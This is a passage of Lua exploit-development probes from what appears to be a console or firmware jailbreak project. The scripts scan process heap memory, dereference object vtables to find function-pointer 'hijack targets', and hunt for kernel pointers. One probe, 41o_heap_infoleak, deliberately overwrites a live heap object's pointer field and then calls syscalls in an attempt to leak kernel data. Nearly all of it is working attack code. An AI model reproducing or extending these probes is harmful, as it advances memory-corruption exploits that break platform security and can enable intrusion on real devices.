            local ql = memory.read_dword(p):tonumber()
            local qh = memory.read_dword(p + 4):tonumber()
            print(string.format("    +%d: %08x_%08x", i * 8, qh, ql))
        end
    end
end

print("")
print("--- interpretation guide ---")
print("P contains several same-arena heap ptrs  -> shared type/proto object")
print("P entries deref to more tables           -> Lua proto/GC metadata")
print("any CODE?? entry in P                    -> function ptr = hijack target")
print("=== 41n DONE ===")
```

## probes/phase7_heap_exploitation/41n_obj_vtable.lua

```lua
-- CRASH_CLASS: SAFE (read-only, heap objects only)
-- PROBE 41n: dump full qwords from heap objects referenced by bucket table
-- From 41l: objects start with dword 0x1A3A4EE0 but we only read 4 bytes
-- We need the FULL 8-byte value to know the real pointer
-- AVOID reading 0x1A3A4EE0 directly — it crashed 41m

print("=== PROBE 41n: OBJECT VTABLE ANALYSIS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end

--------------------------------------------------------------------
-- SECTION 1: Read full qwords from known heap objects
-- These are the targets from the bucket table at 0x142621xxx
--------------------------------------------------------------------
print("--- SECTION 1: HEAP OBJECT FULL QWORD DUMPS ---")

local targets = {
    {name="bucket808", addr=0x3108608D0},
    {name="bucket848", addr=0x31057AB10},
    {name="bucket888", addr=0x310840CF0},
    {name="bucket8C8", addr=0x310617AD0},
    {name="ref3_948",  addr=0x310838010},
    {name="ref4_950",  addr=0x31084B430},
    {name="bucket958", addr=0x3107D8F70},
    {name="bucket960", addr=0x3106A08D0},
}

local vtable_values = {}

for _, t in ipairs(targets) do
    print(string.format("  %s at 0x%X:", t.name, t.addr))
    local q0 = safe_rq(uint64(t.addr))
    if q0 == nil then
        print("    FAULT")
    else
        local h0, l0 = get_hi_lo(q0)
        print(string.format("    +00: %s", dump_qword(q0)))

        -- record the vtable value
        local key = string.format("%08X_%08X", h0, l0)
        vtable_values[key] = (vtable_values[key] or 0) + 1

        -- dump +08 through +78 as qwords
        for off = 8, 0x78, 8 do
            local q = safe_rq(uint64(t.addr + off))
            if q then
                local h, l = get_hi_lo(q)
                local tag = ""
                if h >= 0xFFFFFF80 then tag = " KPTR!" end
                if h == 0 and l >= 0x80000000 and l < 0x90000000 then tag = " TEXT" end
                if h == 3 then tag = " HEAP" end
                if h == 1 then tag = " DATA" end
                if h == 0 and l == 0 then tag = " NULL" end
                if h ~= 0 or l ~= 0 then
                    print(string.format("    +%02X: %s%s", off, dump_qword(q), tag))
                end
            end
        end
    end
    print("")
end

--------------------------------------------------------------------
-- SECTION 2: Summarize vtable/first-qword values
--------------------------------------------------------------------
print("--- SECTION 2: VTABLE VALUE DISTRIBUTION ---")
for key, cnt in pairs(vtable_values) do
    print(string.format("  %s : %d objects", key, cnt))
end
print("")

--------------------------------------------------------------------
-- SECTION 3: If the vtable value is a 64-bit pointer, dereference it
-- The full qword at +00 might be 0xXXXXXXXX_1A3A4EE0
-- Dereference it to see if it points to a function table
--------------------------------------------------------------------
print("--- SECTION 3: DEREFERENCE VTABLE POINTER ---")

for key, _ in pairs(vtable_values) do
    -- parse the key back to hi/lo
    local hi_str = key:sub(1, 8)
    local lo_str = key:sub(10, 17)
    local hi = tonumber(hi_str, 16)
    local lo = tonumber(lo_str, 16)

    if hi == 0 and lo == 0 then
        print("  NULL vtable, skipping")
    else
        print(string.format("  vtable ptr: %08X_%08X", hi, lo))

        -- construct the full address
        -- If hi=0, it's a 32-bit pointer
        -- If hi>0, it's a full 64-bit address
        local vtable_addr
        if hi > 0 then
            vtable_addr = uint64(hi * 0x100000000 + lo)
        else
            vtable_addr = uint64(lo)
        end

        -- try to read at this address (the vtable itself)
        local vt0 = safe_rq(vtable_addr)
        if vt0 then
            print("  READABLE! vtable contents:")
            for off = 0, 0x78, 8 do
                local q = safe_rq(vtable_addr + off)
                if q then
                    local vh, vl = get_hi_lo(q)
                    local tag = ""
                    if vh == 0 and vl >= 0x80000000 and vl < 0x90000000 then
                        tag = " TEXT(code?)"
                    end
                    if vh >= 0xFFFFFF80 then tag = " KPTR!" end
                    if vh == 3 then tag = " HEAP" end
                    if vh == 0 and vl == 0 then tag = " NULL" end
                    if vh ~= 0 or vl ~= 0 then
                        print(string.format("    [+%02X] %s%s", off, dump_qword(q), tag))
                    end
                else
                    print(string.format("    [+%02X] FAULT", off))
                    break
                end
            end

            -- try to dereference entries that look like text-range pointers
            print("  deref code check:")
            local checked = 0
            for off = 0, 0x78, 8 do
                if checked >= 8 then break end
                local q = safe_rq(vtable_addr + off)
                if q then
                    local vh, vl = get_hi_lo(q)
                    -- text range: 0x80000000-0x8FFFFFFF (32-bit)
                    if vh == 0 and vl >= 0x80000000 and vl < 0x90000000 then
                        local code_dw = safe_rd(vl)
                        if code_dw then
                            local b0 = code_dw % 256
                            local is_code = (b0 == 0x55 or b0 == 0x48 or
                                b0 == 0x41 or b0 == 0xE8 or b0 == 0xE9 or
                                b0 == 0xCC or b0 == 0xC3 or b0 == 0x53 or
                                b0 == 0x57 or b0 == 0x89 or b0 == 0x8B or
                                b0 == 0x4C or b0 == 0x50 or b0 == 0x56 or
                                b0 == 0x0F)
                            print(string.format("    [+%02X] -> 0x%08X = %08X b0=%02X %s",
                                off, vl, code_dw, b0, is_code and "CODE!" or "data"))
                            checked = checked + 1
                        end
                    end
                end
            end
        else
            print("  FAULT — not a readable pointer")
            -- maybe it's not a pointer but a magic/tag
            print(string.format("  (value 0x%X_%X may be a type tag, not a pointer)",
                hi, lo))
        end
    end
    print("")
end

--------------------------------------------------------------------
-- SECTION 4: VA map — text/safe addresses only, no risky ranges
--------------------------------------------------------------------
print("--- SECTION 4: TEXT SEGMENT SCAN ---")
do
    -- scan the text range 0x80000000-0x8F000000 at coarse grain
    local text_probes = {
        0x80000000, 0x80100000, 0x80200000, 0x80400000,
        0x80800000, 0x80C00000, 0x80D00000, 0x80E00000,
        0x81000000, 0x82000000, 0x84000000, 0x88000000,
        0x8C000000, 0x8F000000,
    }
    for _, addr in ipairs(text_probes) do
        local d = safe_rd(addr)
        if d then
            local b0 = d % 256
            local tag = ""
            if b0 == 0x55 or b0 == 0x48 or b0 == 0x41 then tag = " (code)" end
            if b0 == 0x7F then tag = " (ELF?)" end
            if b0 == 0 then tag = " (zeroed)" end
            print(string.format("  0x%08X: %08X%s", addr, d, tag))
        else
            print(string.format("  0x%08X: FAULT", addr))
        end
    end
end
print("")

--------------------------------------------------------------------
-- SECTION 5: Also check 0x1_1A3A4EE0 and 0x0_1A3A4EE0 via uint64
-- carefully with a single read, no loops
--------------------------------------------------------------------
print("--- SECTION 5: SINGLE-SHOT POINTER CHECKS ---")
do
    -- 0x1A3A4EE0 as uint64 — single read
    local t1 = safe_rq(uint64("0x1A3A4EE0"))
    print("  uint64(0x1A3A4EE0): " .. (t1 and dump_qword(t1) or "FAULT"))

    -- 0x1_1A3A4EE0
    local t2 = safe_rq(uint64("0x11A3A4EE0"))
    print("  uint64(0x11A3A4EE0): " .. (t2 and dump_qword(t2) or "FAULT"))

    -- 0x0_1A3A4EE0 with dword read
    local t3 = safe_rd(0x1A3A4EE0)
    print("  dword(0x1A3A4EE0): " .. (t3 and string.format("0x%08X", t3) or "FAULT"))
end
print("")

print("=== PROBE 41n COMPLETE ===")
```

## probes/phase7_heap_exploitation/41o_header_chase2.lua

```lua
-- 14.10 Probe 41o: header chase v2 — tight scan with keepalive prints
-- 41n died of silence: 4M-iteration scan produced no output for 30s and
-- the recv timeout killed the connection. Fixes:
--   * scan only [anchor-4MB, anchor+256KB] (41j/41k: live objects were
--     ~136KB BELOW the alloc anchor — heap grows by bump allocation)
--   * print a keepalive line every 64K iterations
-- Same goal: find objects with low dword 0x1A3A4EE0, read full qword P,
-- dump P's region, deref heap entries one level.

print("=== 41o: HEADER CHASE v2 ===")
print("fw: " .. tostring(FW_VERSION))
print("pid: " .. syscall.getpid():tonumber())

local TARGET_LO = 0x1A3A4EE0

local function to_num(v)
    local ok, n = pcall(function() return v:tonumber() end)
    if ok then return n end
    return tonumber(v) or 0
end

local anchor_buf = memory.alloc(16)
local anchor = to_num(anchor_buf)
local heap_hi = math.floor(anchor / 0x100000000)
print(string.format("alloc anchor: 0x%x (hi=0x%x)", anchor, heap_hi))

-- ---------------------------------------------------------------
-- PART 1: scan
-- ---------------------------------------------------------------
local WIN_BACK = 0x400000      -- 4 MB below anchor
local WIN_FWD  = 0x40000       -- 256 KB above
local lo = anchor - (anchor % 8) - WIN_BACK
local hi = anchor + WIN_FWD
print(string.format("scanning 0x%x .. 0x%x", lo, hi))

local hits = {}
local a = lo
local iter = 0
while a < hi do
    if memory.read_dword(a):tonumber() == TARGET_LO then
        table.insert(hits, a)
        print(string.format("HIT @ 0x%x", a))
        if #hits >= 24 then break end
    end
    a = a + 8
    iter = iter + 1
    if iter % 0x10000 == 0 then
        print(string.format("  ... 0x%x (%d hits)", a, #hits))
    end
end
print("scan done: " .. #hits .. " hits")

if #hits == 0 then
    print("no hits — will need wider/different window")
    print("=== 41o DONE (no hits) ===")
    return
end

-- ---------------------------------------------------------------
-- PART 2: full header qwords
-- ---------------------------------------------------------------
print("")
print("--- full header qwords ---")
local real_P = 0
for i = 1, math.min(#hits, 8) do
    local base = hits[i]
    local qw_lo = memory.read_dword(base):tonumber()
    local qw_hi = memory.read_dword(base + 4):tonumber()
    print(string.format("obj @ 0x%x: +0 = %08x_%08x", base, qw_hi, qw_lo))
    if real_P == 0 and qw_hi ~= 0 then
        real_P = qw_hi * 0x100000000 + qw_lo
    end
end

if real_P == 0 then
    print("all high dwords are 0 — TARGET is genuinely 32-bit (weird)")
    print("=== 41o DONE (no pointer) ===")
    return
end
print(string.format("real header pointer P = 0x%x", real_P))

-- ---------------------------------------------------------------
-- PART 3: object dump (first hit)
-- ---------------------------------------------------------------
print("")
print("--- object dump (first hit, 0x80 bytes) ---")
local base = hits[1]
for off = 0, 0x70, 0x10 do
    local p = base + off
    local l1 = memory.read_dword(p):tonumber()
    local h1 = memory.read_dword(p + 4):tonumber()
    local l2 = memory.read_dword(p + 8):tonumber()
    local h2 = memory.read_dword(p + 12):tonumber()
    print(string.format("  +0x%02x: %08x_%08x  %08x_%08x", off, h1, l1, h2, l2))
end

-- ---------------------------------------------------------------
-- PART 4: dump at P
-- ---------------------------------------------------------------
print("")
print("--- dump at P (tag before each read) ---")
local entries = {}
for off = 0, 0x78, 8 do
    print(string.format("read P+0x%02x", off))
    local p = real_P + off
    local ql = memory.read_dword(p):tonumber()
    local qh = memory.read_dword(p + 4):tonumber()
    local v = qh * 0x100000000 + ql
    local cls = "other"
    if v == 0 then cls = "null"
    elseif v < 0x10000 then cls = "small-int"
    elseif qh == heap_hi then cls = "HEAP"
    elseif v >= 0x20000000 and v < 0x60000000 then cls = "CODE??"
    end
    print(string.format("  P+0x%02x: %08x_%08x  %s", off, qh, ql, cls))
    if v ~= 0 then table.insert(entries, { off = off, val = v, cls = cls }) end
end

-- ---------------------------------------------------------------
-- PART 5: one-level deref of heap entries
-- ---------------------------------------------------------------
print("")
print("--- deref heap entries ---")
for _, e in ipairs(entries) do
    if e.cls == "HEAP" then
        print(string.format("deref P+0x%02x -> 0x%x", e.off, e.val))
        for i = 0, 3 do
            local p = e.val + i * 8
            local ql = memory.read_dword(p):tonumber()
            local qh = memory.read_dword(p + 4):tonumber()
            print(string.format("    +%d: %08x_%08x", i * 8, qh, ql))
        end
    end
end

print("=== 41o DONE ===")
```

## probes/phase7_heap_exploitation/41o_heap_infoleak.lua

```lua
-- CRASH_CLASS: RISKY (heap corruption for info leak)
-- PROBE 41o: corrupt heap object pointers to leak kernel data
-- Strategy:
--   A) Find live objects adjacent to freed regions (we can write there)
--   B) Overwrite a pointer field in a live object
--   C) Call syscalls that might dereference it and return data to us
--   D) Check if returned data contains kernel pointers (0xFFFFxxxx range)
-- Also:
--   E) Exhaustive kptr scan across wider heap range
--   F) Try dynlib_get_info with corrupted handle to leak module info

print("=== PROBE 41o: HEAP INFO LEAK ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, lo, hi)
    local ok1 = safe_wd(addr, lo)
    local ok2 = safe_wd(addr + 4, hi)
    return ok1 and ok2
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_pipe   = make_syscall(42)
local sc_close  = make_syscall(6)
local sc_read   = make_syscall(3)
local sc_write  = make_syscall(4)
local sc_socket = make_syscall(97)
local sc_getsockopt = make_syscall(118)
local sc_dynlib_get_list = make_syscall(592)
local sc_dynlib_get_info = make_syscall(593)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

local base = do_mmap(PAGE)
if not base then print("mmap FAILED"); return end
print("anchor: " .. hex(base))
print("")

--------------------------------------------------------------------
-- SECTION 1: Exhaustive kptr scan (wider + denser than 41d)
-- Check every 8 bytes on non-zero pages for high-bit pointers
--------------------------------------------------------------------
print("--- SECTION 1: EXHAUSTIVE KPTR SCAN ---")
local kptrs = {}
local scanned_pages = 0
local scanned_qwords = 0

for i = 1, 384 do
    local pg = base - i * 0x1000
    if pg <= 0 then break end
    local v = safe_rd(pg)
    if v == nil then break end
    scanned_pages = scanned_pages + 1
    if v ~= 0 and v ~= 0xAFAFAFAF then
        -- dense scan: every 8 bytes, first 512 bytes of page
        for off = 0, 0x1F8, 8 do
            local q = safe_rq(pg + off)
            if q then
                scanned_qwords = scanned_qwords + 1
                local h, l = get_hi_lo(q)
                -- kernel range: high bytes are 0xFFFFFFxx
                if h >= 0xFFFFFF00 and h ~= 0xFFFFFFFF then
                    kptrs[#kptrs + 1] = {addr = pg + off, hi = h, lo = l}
                end
                -- also check for plausible kernel: 0xFFFF8xxx
                if h >= 0xFFFF8000 and h < 0xFFFFFF00 then
                    kptrs[#kptrs + 1] = {addr = pg + off, hi = h, lo = l}
                end
            end
        end
    end
end
print("scanned: " .. scanned_pages .. " pages, " .. scanned_qwords .. " qwords")
print("kernel pointers found: " .. #kptrs)
for j, k in ipairs(kptrs) do
    if j > 16 then break end
    print(string.format("  %s: %08X_%08X", hex(k.addr), k.hi, k.lo))
end
print("")

--------------------------------------------------------------------
-- SECTION 2: Locate memory.alloc buffers relative to anchor
-- If we can find our own buffers, we can use them as read targets
--------------------------------------------------------------------
print("--- SECTION 2: ALLOC BUFFER LOCATION ---")

-- alloc a buffer with a unique marker
local marker_buf = memory.alloc(256)
memory.write_dword(marker_buf, 0xCAFE1234)
memory.write_dword(marker_buf + 4, 0xDEAD5678)
memory.write_dword(marker_buf + 8, 0xBEEF9ABC)
print("marker_buf at: " .. hex(marker_buf))

-- scan for the marker in our readable range
local found_marker = nil
for i = 1, 256 do
    local pg = base - i * 0x1000
    if pg <= 0 then break end
    for off = 0, 0xF00, 4 do
        local d = safe_rd(pg + off)
        if d == 0xCAFE1234 then
            local d2 = safe_rd(pg + off + 4)
            if d2 == 0xDEAD5678 then
                found_marker = pg + off
                break
            end
        end
    end
    if found_marker then break end
end

if found_marker then
    print("FOUND marker at: " .. hex(found_marker))
    print("offset from anchor: " .. hex(base - found_marker))
    -- verify
    local v1 = safe_rd(found_marker + 8)
    print("verify [+8]: " .. (v1 and hex(v1) or "?") .. " (expect 0xBEEF9ABC)")
else
    print("marker NOT found in scan range")
end
print("")

--------------------------------------------------------------------
-- SECTION 3: dynlib_get_info leak attempt
-- Get the dynlib list, then try to read module info
-- The returned info struct may contain base addresses
--------------------------------------------------------------------
print("--- SECTION 3: DYNLIB INFO LEAK ---")

local handle_buf = memory.alloc(1024)
local num_buf = memory.alloc(8)

local ok_gl, ret_gl = pcall(function()
    return sc_dynlib_get_list(handle_buf, uint64(128), num_buf)
end)
print("dynlib_get_list: " .. (ok_gl and "ok" or "FAIL") ..
    " ret=" .. (ok_gl and hex(to_num(ret_gl)) or "?"))

local num_handles = safe_rd(num_buf)
print("num_handles: " .. (num_handles and tostring(num_handles) or "?"))

if num_handles and num_handles > 0 then
    -- read first few handles
    local handles = {}
    for i = 0, math.min(num_handles - 1, 7) do
        local h = safe_rd(handle_buf + i * 4)
        if h then
            handles[#handles + 1] = h
            print(string.format("  handle[%d] = 0x%X", i, h))
        end
    end

    -- try dynlib_get_info on each handle
    -- info struct is ~0x160 bytes
    local info_buf = memory.alloc(0x200)

    for idx, handle in ipairs(handles) do
        if idx > 4 then break end
        -- zero the buffer first
        for off = 0, 0x1F8, 4 do
            safe_wd(info_buf + off, 0)
        end
        -- set the size field (first 8 bytes = struct size)
        safe_wd(info_buf, 0x160)

        local ok_gi, ret_gi = pcall(function()
            return sc_dynlib_get_info(uint64(handle), info_buf)
        end)
        print(string.format("  get_info(0x%X): %s ret=%s",
            handle, ok_gi and "ok" or "FAIL",
            ok_gi and hex(to_num(ret_gi)) or "?"))

        if ok_gi then
            -- scan info_buf for interesting values
            local found_text = false
            local found_kptr = false
            for off = 0, 0x158, 8 do
                local q = safe_rq(info_buf + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 then
                        print(string.format("    [+%02X] %s KPTR!", off, dump_qword(q)))
                        found_kptr = true
                    end
                    if h == 0 and l >= 0x80000000 and l < 0x90000000 then
                        print(string.format("    [+%02X] %s TEXT", off, dump_qword(q)))
                        found_text = true
                    end
                    -- any large non-zero value
                    if (h ~= 0 or l > 0x10000) and h < 0xFFFF8000 then
                        if off <= 0x40 or h >= 1 then
                            print(string.format("    [+%02X] %s", off, dump_qword(q)))
                        end
                    end
                end
            end
            if not found_text and not found_kptr then
                print("    (no text or kernel pointers)")
            end
        end
    end
else
    print("  no handles or get_list failed")
end
print("")

--------------------------------------------------------------------
-- SECTION 4: Pipe buffer content leak
-- Create pipe, write data, check if the pipe's internal buffer
-- appears in our heap range (would give us a known-content target)
--------------------------------------------------------------------
print("--- SECTION 4: PIPE BUFFER SCAN ---")

local pipe_fds = memory.alloc(16)
local ok_p = pcall(function() sc_pipe(pipe_fds) end)
if ok_p then
    local rfd = safe_rd(pipe_fds)
    local wfd = safe_rd(pipe_fds + 4)
    print("pipe fds: r=" .. (rfd or "?") .. " w=" .. (wfd or "?"))

    if wfd and wfd > 0 then
        -- write a distinctive pattern to the pipe
        local wbuf = memory.alloc(64)
        memory.write_dword(wbuf, 0x50495045)     -- "PIPE"
        memory.write_dword(wbuf + 4, 0x4C45414B)  -- "LEAK"
        memory.write_dword(wbuf + 8, 0x54455354)  -- "TEST"
        memory.write_dword(wbuf + 12, 0x44415441) -- "DATA"

        local ok_w = pcall(function()
            sc_write(uint64(wfd), wbuf, uint64(16))
        end)
        print("write to pipe: " .. (ok_w and "ok" or "FAIL"))

        -- scan heap for "PIPE" marker
        local pipe_found = nil
        for i = 1, 256 do
            local pg = base - i * 0x1000
            if pg <= 0 then break end
            local v = safe_rd(pg)
            if v == nil then break end
            if v == 0x50495045 then
                local v2 = safe_rd(pg + 4)
                if v2 == 0x4C45414B then
                    pipe_found = pg
                    break
                end
            end
            -- also check within page
            if v ~= 0 and v ~= 0xAFAFAFAF then
                for off = 4, 0xF00, 4 do
                    local d = safe_rd(pg + off)
                    if d == 0x50495045 then
                        local d2 = safe_rd(pg + off + 4)
                        if d2 == 0x4C45414B then
                            pipe_found = pg + off
                            break
                        end
                    end
                end
            end
            if pipe_found then break end
        end

        if pipe_found then
            print("PIPE DATA FOUND at: " .. hex(pipe_found))
            -- dump context around it (might contain kernel buffer ptrs)
            for off = -0x40, 0x40, 8 do
                local q = safe_rq(pipe_found + off)
                if q then
                    local h, l = get_hi_lo(q)
                    local tag = ""
                    if h >= 0xFFFF8000 then tag = " KPTR!" end
                    if h == 0 and l >= 0x80000000 then tag = " TEXT?" end
                    if h == 3 then tag = " HEAP" end
                    print(string.format("  [%+03X] %s%s", off, dump_qword(q), tag))
                end
            end
        else
            print("pipe data NOT in scan range (kernel buffer)")
        end

        -- read back from pipe to verify
        local rbuf = memory.alloc(64)
        local ok_r = pcall(function()
            sc_read(uint64(rfd), rbuf, uint64(16))
        end)
        local rd1 = safe_rd(rbuf)
        print("read back: " .. (ok_r and "ok" or "FAIL") ..
            " data=" .. (rd1 and hex(rd1) or "?"))
    end

    -- close pipe
    if rfd and rfd > 0 then pcall(function() sc_close(rfd) end) end
    if wfd and wfd > 0 then pcall(function() sc_close(wfd) end) end
end
print("")

--------------------------------------------------------------------
-- SECTION 5: Socket option leak
-- getsockopt may return internal kernel data
--------------------------------------------------------------------
print("--- SECTION 5: SOCKET OPTION LEAK ---")
do
    local ok_s, sfd = pcall(function() return sc_socket(2, 1, 0) end)
    if ok_s then
        local fd = to_num(sfd)
        print("socket fd: " .. fd)
        if fd > 0 then
            local opt_buf = memory.alloc(256)
            local len_buf = memory.alloc(8)

            -- try various socket options that might leak info
            -- SOL_SOCKET=0xFFFF, SO_TYPE=0x1008, SO_SNDBUF=0x1001
            -- SO_RCVBUF=0x1002, SO_ERROR=0x1007
            local opts = {
                {level=0xFFFF, opt=0x1008, name="SO_TYPE"},
                {level=0xFFFF, opt=0x1001, name="SO_SNDBUF"},
                {level=0xFFFF, opt=0x1002, name="SO_RCVBUF"},
                {level=0xFFFF, opt=0x1007, name="SO_ERROR"},
                {level=0xFFFF, opt=0x0010, name="SO_LINGER"},
                {level=0xFFFF, opt=0x0020, name="SO_ACCEPTCONN"},
                {level=6, opt=1, name="TCP_NODELAY"},
            }

            for _, o in ipairs(opts) do
                -- zero buf, set len
                for off = 0, 64, 4 do safe_wd(opt_buf + off, 0) end
                safe_wd(len_buf, 256)

                local ok_go, ret_go = pcall(function()
                    return sc_getsockopt(uint64(fd), uint64(o.level),
                        uint64(o.opt), opt_buf, len_buf)
                end)
                if ok_go then
                    local rlen = safe_rd(len_buf)
                    local val = safe_rd(opt_buf)
                    local val2 = safe_rd(opt_buf + 4)
                    print(string.format("  %s: ret=%s len=%s val=%s %s",
                        o.name, hex(to_num(ret_go)),
                        rlen and tostring(rlen) or "?",
                        val and hex(val) or "?",
                        val2 and val2 ~= 0 and hex(val2) or ""))
                end
            end

            pcall(function() sc_close(fd) end)
        end
    else
        print("socket create failed")
    end
end
print("")

--------------------------------------------------------------------
-- SECTION 6: Corrupt a live object's pointer, call dynlib syscalls
-- to see if they chase the corrupted pointer
--------------------------------------------------------------------
print("--- SECTION 6: POINTER CORRUPTION LEAK ---")
do
    -- find a live object with heap pointers adjacent to freed region
    local target_obj = nil
    local freed_end = nil

    for i = 1, 384 do
        local pg = base - i * 0x1000
        if pg <= 0 then break end
        local v = safe_rd(pg)
        if v == nil then break end

        if v == 0xAFAFAFAF then
            -- check next page for live object
            local next_pg = pg + 0x1000
            local nv = safe_rd(next_pg)
            if nv and nv ~= 0 and nv ~= 0xAFAFAFAF then
                -- found freed->live boundary
                -- check if live object has pointer fields
                local q0 = safe_rq(next_pg)
                local q8 = safe_rq(next_pg + 8)
                if q0 and q8 then
                    local h0, l0 = get_hi_lo(q0)
                    local h8, l8 = get_hi_lo(q8)
                    if (h0 == 3 or h8 == 3 or h0 == 1 or h8 == 1) then
                        target_obj = next_pg
                        freed_end = pg
                        break
                    end
                end
            end
        end
    end

    if target_obj then
        print("  live object at: " .. hex(target_obj))
        print("  freed region ends at: " .. hex(freed_end))

        -- dump the live object
        print("  object dump:")
        local saved = {}
        for off = 0, 0x78, 8 do
            local q = safe_rq(target_obj + off)
            if q then
                saved[off] = q
                local h, l = get_hi_lo(q)
                local tag = ""
                if h >= 0xFFFF8000 then tag = " KPTR!" end
                if h == 3 then tag = " HEAP" end
                if h == 1 then tag = " DATA" end
                if h ~= 0 or l ~= 0 then
                    print(string.format("    [+%02X] %s%s", off, dump_qword(q), tag))
                end
            end
        end

        -- find a HEAP pointer field we can corrupt
        local corrupt_off = nil
        local orig_hi = nil
        local orig_lo = nil
        for off = 8, 0x78, 8 do
            local q = saved[off]
            if q then
                local h, l = get_hi_lo(q)
                if h == 3 and l >= 0x10000000 then
                    corrupt_off = off
                    orig_hi = h
                    orig_lo = l
                    break
                end
            end
        end

        if corrupt_off then
            print(string.format("  corrupting [+%02X]: %08X_%08X",
                corrupt_off, orig_hi, orig_lo))

            -- write our info_buf address here instead
            -- so if a syscall reads through this pointer, it reads our buffer
            -- which we pre-fill with recognizable content
            local spy_buf = memory.alloc(256)
            for off = 0, 252, 4 do
                safe_wd(spy_buf + off, 0)
            end
            -- put markers at specific offsets
            safe_wd(spy_buf, 0x5F100001)

            -- actually: instead of complex indirection, let's just put
            -- a known kptr-range value and see if any syscall returns it
            -- Target: read from 0x1_0E324EE0 (the type desc we found)
            -- by pointing the object's ptr to the base of a structure
            -- that has 0x1_0E324EE0 at a known offset

            -- Simpler: overwrite with the address of our marker_buf
            -- If a syscall reads through this field, the result will
            -- contain our marker (0xCAFE1234)
            if found_marker then
                print("  redirecting to marker_buf via heap addr")
                -- The marker is at found_marker in heap
                -- The pointer field expects a heap address (hi=3)
                -- marker_buf address from memory.alloc: might be in 0x3_1xxx range too

                -- Actually just write the marker_buf address
                local mb_lo = to_num(marker_buf)
                -- memory.alloc returns a 32-bit addr, so full 64-bit is 0x0_XXXXXXXX
                -- But heap pointers are 0x3_1xxxxxxx
                -- Let's use found_marker which IS in the heap range
                -- found_marker is a regular number < 2^32
                -- But it should be the lower 32 bits of a 0x3_1xxxxxxx addr
                -- Actually found_marker = base - offset, and base is ~0x3_1xxxxxxx
                -- So found_marker IS the low 32 bits... but the high bits are 3
                -- We need to write the full 64-bit value
                safe_wd(target_obj + corrupt_off, found_marker % 0x100000000)
                safe_wd(target_obj + corrupt_off + 4, 3)  -- hi = 0x00000003

                local verify = safe_rq(target_obj + corrupt_off)
                print("  verify: " .. (verify and dump_qword(verify) or "FAULT"))

                -- now try syscalls
                print("  trying syscalls...")

                -- dynlib walk
                local hb2 = memory.alloc(1024)
                local nb2 = memory.alloc(8)
                pcall(function() sc_dynlib_get_list(hb2, 128, nb2) end)
                print("    dynlib_get_list done")

                -- check marker_buf for changes
                local m1 = safe_rd(marker_buf)
                print("    marker[0] = " .. (m1 and hex(m1) or "?") ..
                    " (was 0xCAFE1234)")

                -- sigaction walk
                local sa = memory.alloc(64)
                for sig = 1, 8 do
                    pcall(function() make_syscall(416)(sig, uint64(0), sa) end)
                end

                -- check again
                local m2 = safe_rd(marker_buf)
                if m2 ~= m1 then
                    print("    marker CHANGED after sigaction: " .. hex(m2))
                end

                -- pipe/socket churn
                for i = 1, 4 do
                    local pb = memory.alloc(16)
                    pcall(function() sc_pipe(pb) end)
                    local f0 = safe_rd(pb)
                    local f1 = safe_rd(pb + 4)
                    if f0 and f0 > 0 then pcall(function() sc_close(f0) end) end
                    if f1 and f1 > 0 then pcall(function() sc_close(f1) end) end
                end

                local m3 = safe_rd(marker_buf)
                if m3 ~= m1 then
                    print("    marker CHANGED after pipe churn: " .. hex(m3))
                end
            end

            -- RESTORE original pointer
            print("  restoring original pointer...")
            safe_wd(target_obj + corrupt_off, orig_lo)
            safe_wd(target_obj + corrupt_off + 4, orig_hi)
            local restored = safe_rq(target_obj + corrupt_off)
            print("  restored: " .. (restored and dump_qword(restored) or "FAULT"))
        else
            print("  no HEAP pointer field found in object")
        end
    else
        print("  no suitable live object found adjacent to freed region")
    end
end
print("")

pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
print("=== PROBE 41o COMPLETE ===")
```
